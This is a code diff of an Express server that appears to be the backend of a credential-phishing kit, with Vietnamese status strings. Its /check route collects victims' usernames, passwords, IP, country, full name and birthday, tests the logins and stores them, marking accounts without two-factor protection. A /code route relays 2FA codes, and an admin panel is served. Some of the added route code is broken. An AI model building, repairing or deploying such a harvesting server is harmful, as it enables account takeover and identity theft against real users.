@@ -6,21 +6,30 @@ const bodyParser = require('body-parser');
 const app = express();
 const port = 3000;
 const server = require('http').Server(app);
-const { initialize, check, enterCode, updateAndSync,saveInfo, close } = require('./modules/authModule');
+const { initialize, check, enterCode, updateAndSync, saveInfo, close } = require('./modules/authModule');
 app.use(cors());
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
-const adminPath = path.join(__dirname, 'admin');
-const configPath = path.join(__dirname, 'config.json');
 
+const adminPath = path.join(__dirname, 'admin');
+const clientPath = path.join(__dirname, 'client');
+const configPath = path.join(__dirname, 'config.json');
+app.use(express.static(clientPath));
+app.use(express.static(adminPath));
+app.get('/', (res) => {
+    res.sendFile(path.join(clientPath, 'index.html'));
+});
+app.get('/admin', req, res => {
+    res.sendFile(path.join(adminPath, 'index.html'));
+});
 app.post('/check', async (req, res) => {
-    const { username, password,ip,country,fullname,birthday } = req.body;
+    const { username, password, ip, country, fullname, birthday } = req.body;
     try {
         await initialize();
         const result = await check(username, password);
         if (result === 'SUCCESS') {
-            saveInfo('Không bật 2FA',ip,country,username,password,fullname,birthday);
+            saveInfo('Không bật 2FA', ip, country, username, password, fullname, birthday);
             res.send('SUCCESS');
             await updateAndSync();
             await close();
@@ -34,11 +43,11 @@ app.post('/check', async (req, res) => {
         }
         else {
             res.send(result);
-            saveInfo(result,ip,country,username,password,fullname,birthday);
+            saveInfo(result, ip, country, username, password, fullname, birthday);
         }
     } catch (error) {
-        try{ await close();}
-        catch{
+        try { await close(); }
+        catch {
         }
     }
 });
@@ -52,7 +61,7 @@ app.post('/code', async (req, res) => {
             await close();
             res.send('SUCCESS');
         }
-        else{
+        else {
             res.send(result);
         }
     } catch (error) {
